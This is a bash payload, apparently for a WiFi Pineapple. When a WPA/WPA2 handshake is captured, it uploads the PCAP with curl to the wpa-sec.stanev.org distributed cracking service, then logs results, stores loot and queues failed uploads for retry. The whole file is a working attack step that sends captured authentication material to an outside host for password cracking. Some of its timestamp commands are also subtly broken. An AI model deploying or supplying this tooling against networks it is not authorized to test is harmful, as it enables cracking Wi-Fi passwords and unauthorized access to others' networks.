#!/bin/bash
# ============================================================================
# Title: WPA-SEC Auto Upload
# Description: Automatically upload captured handshakes to wpa-sec.stanev.org
# Author: Aitema-GmbH
# Version: 1.3
# Category: alerts/handshake_captured
# ============================================================================
#
# This payload automatically uploads captured WPA/WPA2 handshakes to
# wpa-sec.stanev.org for distributed password cracking.
#
# wpa-sec.stanev.org is a free community-driven distributed WPA/WPA2 cracking
# service. When you upload a handshake, thousands of volunteer GPUs work
# together to crack the password using massive wordlists and rule-based attacks.
#
# Requirements:
#   - Internet connection on the Pineapple
#   - WPA-SEC API key (get free at https://wpa-sec.stanev.org/?get_key)
#
# Configuration:
#   Edit config.sh and add your API key, or use the companion payload
#   wpa-sec-tools to configure via the Pager UI.
#
# ============================================================================

shopt -s nullglob

# =========================
# CONFIGURATION
# =========================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="${SCRIPT_DIR}/config.sh"
GLOBAL_CONFIG="/root/config/wpa-sec.conf"
LOOT_DIR="/root/loot/wpa-sec"
LOG_FILE="$LOOT_DIR/upload.log"
HISTORY_FILE="$LOOT_DIR/history.csv"
WPA_SEC_URL="https://wpa-sec.stanev.org"

# =========================
# LOAD CONFIG
# =========================
if [ -f "$CONFIG_FILE" ]; then
    source "$CONFIG_FILE"
elif [ -f "$GLOBAL_CONFIG" ]; then
    source "$GLOBAL_CONFIG"
fi

# =========================
# HELPER FUNCTIONS
# =========================
log_entry() {
    local msg="$1"
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    echo "[$timestamp] $msg" >> "$LOG_FILE"
}

# =========================
# MAIN
# =========================
mkdir -p "$LOOT_DIR"

# Log alert trigger
log_entry "=========================================="
log_entry "HANDSHAKE CAPTURED - WPA-SEC UPLOAD"
log_entry "=========================================="
log_entry "Type: $_ALERT_HANDSHAKE_TYPE"
log_entry "AP: $_ALERT_HANDSHAKE_AP_MAC_ADDRESS"
log_entry "Client: $_ALERT_HANDSHAKE_CLIENT_MAC_ADDRESS"

# Check configuration
if [ -z "$WPA_SEC_KEY" ] || [ "$WPA_SEC_KEY" = "YOUR_API_KEY_HERE" ]; then
    log_entry "ERROR: WPA-SEC API key not configured"
    log_entry "Please edit config.sh or run wpa-sec-tools Setup"
    LED FAIL
    exit 1
fi

# Check if auto-upload is enabled
if [ "$AUTO_UPLOAD" = "false" ]; then
    log_entry "Auto-upload disabled, skipping"
    exit 0
fi

# Get the PCAP file path
# IMPORTANT: wpa-sec only accepts PCAP files, not .22000 hashcat format!
PCAP_FILE="$_ALERT_HANDSHAKE_PCAP_PATH"

if [ -z "$PCAP_FILE" ] || [ ! -f "$PCAP_FILE" ]; then
    log_entry "ERROR: No PCAP file found at: $PCAP_FILE"
    LED FAIL
    exit 1
fi

# Skip if it's a .22000 file (wpa-sec doesn't accept these)
if echo "$PCAP_FILE" | grep -qi "\.22000$"; then
    log_entry "SKIP: .22000 files not accepted by wpa-sec (PCAP only)"
    exit 0
fi

log_entry "Uploading: $PCAP_FILE"

# Upload indicator
LED ATTACK

# Upload to wpa-sec
FILENAME=$(basename "$PCAP_FILE")
TIMEOUT=${CONNECT_TIMEOUT:-30}
MAX=${MAX_TIME:-120}

response=$(curl -s -X POST "$WPA_SEC_URL" \
    -H "Cookie: key=$WPA_SEC_KEY" \
    -F "file=@$PCAP_FILE;filename=$FILENAME" \
    --connect-timeout "$TIMEOUT" \
    --max-time "$MAX" \
    2>&1)

# Parse response
# wpa-sec returns hcxpcapngtool output, look for success indicators
# BusyBox compatible grep (no -P flag!)
if echo "$response" | grep -qi "processed cap files\|written to 22000\|EAPOL pairs written\|PMKID.*written"; then
    log_entry "SUCCESS: Uploaded $FILENAME"
    
    # Log to history CSV
    echo "$(date +%Y-%m-%d %H:%M:%S),$FILENAME,$_ALERT_HANDSHAKE_AP_MAC_ADDRESS,$_ALERT_HANDSHAKE_TYPE,success" >> "$HISTORY_FILE"
    
    # Backup the file
    cp "$PCAP_FILE" "$LOOT_DIR/" 2>/dev/null
    
    LED FINISH
    
    if [ "$VIBRATE_ON_SUCCESS" = "true" ]; then
        VIBRATE
    fi
    
    if [ "$SHOW_ALERT" = "true" ]; then
        ALERT "WPA-SEC Upload OK!\n\nFile: $FILENAME\nAP: $_ALERT_HANDSHAKE_AP_MAC_ADDRESS\n\nCheck results at:\nwpa-sec.stanev.org/?my_nets"
    fi
    
elif echo "$response" | grep -qi "already\|duplicate"; then
    log_entry "SKIP: Already uploaded (duplicate)"
    echo "$(date +%Y-%m-%d %H:%M:%S),$FILENAME,$_ALERT_HANDSHAKE_AP_MAC_ADDRESS,$_ALERT_HANDSHAKE_TYPE,duplicate" >> "$HISTORY_FILE"
    LED SETUP
    
else
    log_entry "FAIL: Upload failed"
    log_entry "Response: $response"
    echo "$(date +%Y-%m-%d %H:%M:%S),$FILENAME,$_ALERT_HANDSHAKE_AP_MAC_ADDRESS,$_ALERT_HANDSHAKE_TYPE,failed" >> "$HISTORY_FILE"
    
    # Queue for retry
    echo "$PCAP_FILE" >> "$LOOT_DIR/pending_uploads.txt"
    
    LED FAIL
fi

exit 0
